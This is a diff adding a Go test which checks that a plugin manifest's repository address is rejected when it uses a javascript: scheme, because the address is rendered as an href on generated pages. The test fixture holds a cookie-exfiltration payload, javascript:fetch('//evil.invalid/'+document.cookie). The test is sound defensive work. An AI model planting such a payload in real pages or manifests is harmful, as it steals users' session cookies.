@@ -863,3 +863,35 @@ func containsString(xs []string, x string) bool {
 	}
 	return false
 }
+
+// TestLoadRepoMetaRefusesExecutableRepository proves the repository address is
+// screened for an executable scheme like the bibliography URLs are: it becomes an
+// href on every emitted page, so a javascript: address must fail the build rather
+// than be escaped into the markup.
+func TestLoadRepoMetaRefusesExecutableRepository(t *testing.T) {
+	root := t.TempDir()
+	dir := filepath.Join(root, ".claude-plugin")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	manifest := `{"name":"x","description":"d","author":{"name":"a"},"repository":"javascript:fetch('//evil.invalid/'+document.cookie)","license":"MIT"}`
+	if err := os.WriteFile(filepath.Join(dir, "plugin.json"), []byte(manifest), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := LoadRepoMeta(root); err == nil {
+		t.Fatal("LoadRepoMeta accepted a javascript: repository address")
+	} else if !strings.Contains(err.Error(), "javascript") {
+		t.Errorf("refusal does not name the scheme: %v", err)
+	}
+
+	// A normal https repository still loads.
+	ok := `{"name":"x","description":"d","author":{"name":"a"},"repository":"https://example.invalid/x/repo","license":"MIT"}`
+	if err := os.WriteFile(filepath.Join(dir, "plugin.json"), []byte(ok), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if m, err := LoadRepoMeta(root); err != nil {
+		t.Fatalf("LoadRepoMeta rejected a valid https repository: %v", err)
+	} else if m.Repository != "https://example.invalid/x/repo" {
+		t.Errorf("repository not loaded: %q", m.Repository)
+	}
+}
